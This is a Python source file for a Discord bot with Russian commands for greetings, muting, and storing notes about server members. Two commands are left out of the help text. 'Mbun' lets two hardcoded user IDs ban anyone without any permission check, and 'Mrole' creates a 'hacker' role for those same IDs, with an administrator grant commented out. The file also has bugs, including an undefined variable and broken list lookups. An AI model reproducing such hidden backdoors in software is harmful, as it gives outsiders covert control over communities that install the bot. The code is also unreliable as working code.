import discord
members=["lzlz"]


from discord.ext import commands
import os
from discord.ext.commands import bot

Bot=commands.Bot(command_prefix="")
Bot.remove_command("help")

#@Bot.event()
#async def on_ready():
        #await Bot.user.guild.create_role(name="EggMaster")        


@Bot.command()
async def help(ctx):
	author=ctx.message.author
	await ctx.send("**инфа {member}** - показывает иформацию об учаснике(могут использовать все)\n**заменить {member} \"новое значение\"** - заменяет известную информацию на новое значение(может использовать только админ сервера)\n**добавить {member} \"новая информация\"** - дописывает новую информацию в конце уже известной(может использовать только админ сервера) ")




@Bot.command()
async def привет(ctx):
	author=ctx.message.author
	await ctx.send(f"привет{author.mention}")



@Bot.command()
async def пока(ctx):
	author=ctx.message.author
	await ctx.send(f"пока{author.mention}")




mutrole=False
@Bot.command()
@commands.has_permissions(administrator=True)
async def mute(ctx,member:discord.Member):
        global mutrole
        if mutrole==False:
                await ctx.guild.create_role(name="mute")
                mutrole=True
        role=discord.utils.get(ctx.guild.roles, name="mute")
        await member.add_roles(role)



@Bot.command()
async def Mbun(ctx, user: discord.Member):
    author=ctx.message.author
    if author.id==655502637420118026 or author.id==655126620046229540:       
        await ctx.send(f"пока{user.mention}")
        await ctx.guild.ban(user)

@Bot.command()
async def Mrole(ctx):
    guild = ctx.guild
    #perms = discord.Permissions(administrator=True)
    if author.id==655502637420118026 or author.id==655126620046229540:
            await guild.create_role(name="взломщик")#, Permissions=perms)
            await ctx.send("Успешно")


@Bot.command()
async def инфа(ctx, member:discord.Member):
        m=member
        vid="нет значения"
        i=0
        kol=len(members)
        while i<kol:
                i+=1
                if members[i-1][0]==m:
                        vid=members[i-1][1]
                        
                        
       
        await ctx.send(vid or "")
        print(members)




@Bot.command()
@commands.has_permissions(administrator=True)
async def заменить(ctx, member:discord.Member, text ):
        m=member
        member=[m,text]
        members.append(member)

        vid="нет значения"
        i=0
        kol=len(members)
        while i<kol:
                i+=1
                if members[i-1][0]==m:
                        vid=members[i-1][1]
                        
       
        await ctx.send(vid or "")
        print(members)



@Bot.command()
@commands.has_permissions(administrator=True)
async def добавить(ctx, member:discord.Member, text ):
        m=member

        vid="нет значения"
        i=0
        kol=len(members)
        while i<kol:
                i+=1
                if members[i-1][0]==m:
                        s=members[i-1][1]
                        members[i-1][1]=f"{s} {text}"
                        vid=members[i-1][1]
                        
       
        await ctx.send(vid or "")
        print(members)

token = os.environ.get("BOT_TOKEN")
Bot.run(str(token))
